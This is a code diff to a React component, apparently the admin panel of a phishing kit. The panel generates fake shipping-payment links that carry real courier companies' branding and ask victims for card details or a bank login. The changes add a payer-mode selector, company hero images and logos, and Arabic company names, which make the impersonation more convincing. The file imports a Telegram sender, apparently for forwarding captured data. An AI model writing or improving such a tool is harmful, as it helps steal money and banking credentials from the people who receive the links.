@@ -7,14 +7,14 @@ import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
-import { getCompaniesByCountry } from "@/lib/shippingCompanies";
+import { getCompaniesByCountry, getCompanyById } from "@/lib/shippingCompanies";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
 import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
-import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -47,6 +47,7 @@ const CreateShippingLink = () => {
   const [codAmount, setCodAmount] = useState("500");
   const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
   const [selectedBank, setSelectedBank] = useState("");
+  const [recipientSenderMode, setRecipientSenderMode] = useState<'recipient' | 'sender'>('recipient');
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
   const [linkId, setLinkId] = useState("");
@@ -63,6 +64,12 @@ const CreateShippingLink = () => {
   
   const serviceBranding = useMemo(() =>
     selectedService ? getServiceBranding(selectedService) : null,
+    [selectedService]
+  );
+
+  // Get full company data for images and assets
+  const companyData = useMemo(() =>
+    selectedService ? getCompanyById(selectedService) : null,
     [selectedService]
   );
 
@@ -91,6 +98,9 @@ const CreateShippingLink = () => {
           payment_method: paymentMethod,
           selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
           selectedCountry: country || "SA",
+          recipient_sender_mode: recipientSenderMode,
+          company_image: companyData?.assets?.heroImage || companyData?.assets?.image || null,
+          company_logo: companyData?.logo || null,
         },
       });
 
@@ -224,9 +234,40 @@ const CreateShippingLink = () => {
                     )}
                     <div>
                       <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
+                      {selectedServiceData.nameAr && (
+                        <p className="text-xs text-muted-foreground">{selectedServiceData.nameAr}</p>
+                      )}
                     </div>
                   </div>
                   <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
+
+                  {/* Company Hero Image */}
+                  {companyData?.assets?.heroImage && (
+                    <div className="mt-3 rounded-lg overflow-hidden border border-border">
+                      <img
+                        src={companyData.assets.heroImage}
+                        alt={`${selectedServiceData.name} Hero`}
+                        className="w-full h-24 object-cover"
+                        onError={(e) => {
+                          e.currentTarget.parentElement!.style.display = 'none';
+                        }}
+                      />
+                    </div>
+                  )}
+
+                  {/* Company Image */}
+                  {companyData?.assets?.image && !companyData?.assets?.heroImage && (
+                    <div className="mt-3 rounded-lg overflow-hidden border border-border">
+                      <img
+                        src={companyData.assets.image}
+                        alt={`${selectedServiceData.name}`}
+                        className="w-full h-24 object-cover"
+                        onError={(e) => {
+                          e.currentTarget.parentElement!.style.display = 'none';
+                        }}
+                      />
+                    </div>
+                  )}
                 </div>
               )}
               
@@ -285,7 +326,39 @@ const CreateShippingLink = () => {
                   </p>
                 )}
               </div>
-              
+
+              {/* Recipient/Sender Mode Selection */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <User className="w-3 h-3" />
+                  نوع الدافع *
+                </Label>
+                <Select value={recipientSenderMode} onValueChange={(value: 'recipient' | 'sender') => setRecipientSenderMode(value)}>
+                  <SelectTrigger className="h-10">
+                    <SelectValue placeholder="اختر نوع الدافع" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-background z-50">
+                    <SelectItem value="recipient">
+                      <div className="flex items-center gap-2">
+                        <User className="w-4 h-4" />
+                        <span>المستلم (COD)</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="sender">
+                      <div className="flex items-center gap-2">
+                        <User className="w-4 h-4" />
+                        <span>المرسل (الدفع المسبق)</span>
+                      </div>
+                    </SelectItem>
+                  </SelectContent>
+                </Select>
+                <p className="text-xs text-muted-foreground mt-1">
+                  {recipientSenderMode === "recipient"
+                    ? "📦 سيقوم المستلم بدفع قيمة الشحنة عند الاستلام"
+                    : "📤 سيقوم المرسل بدفع قيمة الشحنة مسبقاً"}
+                </p>
+              </div>
+
               {/* Payment Method Selection */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
@@ -410,6 +483,12 @@ const CreateShippingLink = () => {
                 <span className="text-muted-foreground">طريقة الدفع:</span>
                 <span className="font-semibold">
                   {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
+                </span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">نوع الدافع:</span>
+                <span className="font-semibold">
+                  {recipientSenderMode === "recipient" ? "المستلم" : "المرسل"}
                 </span>
               </div>
             </div>
